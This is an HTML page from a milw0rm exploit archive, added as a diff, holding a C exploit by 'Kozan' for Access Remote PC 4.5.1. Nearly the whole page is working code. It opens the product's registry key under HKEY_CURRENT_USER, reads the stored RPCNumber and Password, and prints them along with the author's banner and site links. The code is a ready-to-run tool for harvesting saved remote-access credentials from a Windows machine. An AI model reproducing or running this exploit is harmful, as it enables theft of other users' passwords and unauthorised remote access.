@@ -1,0 +1,69 @@
+<html><head><title>Access Remote PC 4.5.1 Local Password Disclosure Exploit</title></head><pre>/*****************************************************************
+
+Access Remote PC 4.5.1 Local Password Disclosure Exploit by Kozan
+
+Application: Access Remote PC 4.5.1 (and probably prior versions)
+Vendor: www.access-remote-pc.com
+
+Vulnerable Description: Access Remote PC 4.5.1 discloses passwords
+to local users.
+
+Discovered &amp; Coded by: Kozan
+Credits to ATmaCA
+Web : www.netmagister.com
+Web2: www.spyinstructors.com
+Mail: kozan@netmagister.com
+
+*****************************************************************/
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+#define BUF 100
+
+int main()
+{
+       HKEY hKey;
+       char RPCNumber[BUF], Password[BUF];
+       DWORD dwBuf = BUF;
+
+       if( RegOpenKeyEx( HKEY_CURRENT_USER,
+                         &quot;Software\\Access Remote PC\\Client\\Options\\Proxy&quot;,
+                         0,
+                         KEY_QUERY_VALUE,
+                         &amp;hKey
+                         ) !=ERROR_SUCCESS )
+       {
+               fprintf( stdout, &quot;Access Remote PC is not installed on you PC!\n&quot; );
+               return -1;
+       }
+
+       if( RegQueryValueEx( hKey,
+                            &quot;RPCNumber&quot;,
+                            NULL,
+                            NULL,
+                            (BYTE *)&amp;RPCNumber,
+                            &amp;dwBuf
+                            ) != ERROR_SUCCESS )
+       lstrcpy( RPCNumber,&quot;Not Found!\n&quot; );
+
+       if( RegQueryValueEx( hKey,
+                            &quot;Password&quot;,
+                            NULL,
+                            NULL,
+                            (BYTE *)&amp;Password,
+                            &amp;dwBuf
+                            ) != ERROR_SUCCESS )
+       lstrcpy( Password,&quot;Not Found!\n&quot; );
+
+       fprintf( stdout, &quot;Access Remote PC 4.5.1 Local Exploit by Kozan\n&quot; );
+       fprintf( stdout, &quot;Credits to AtmaCA\n&quot; );
+       fprintf( stdout, &quot;www.netmagister.com - www.spyinstructors.com \n&quot; );
+       fprintf( stdout, &quot;kozan@netmagister.com\n\n&quot; );
+       fprintf( stdout, &quot;RPCNumber\t: %s\n&quot;, RPCNumber );
+       fprintf( stdout, &quot;Password\t: %s\n&quot;, Password );
+
+       return 0;
+}
+
+// milw0rm.com [2005-07-04]</pre></html>
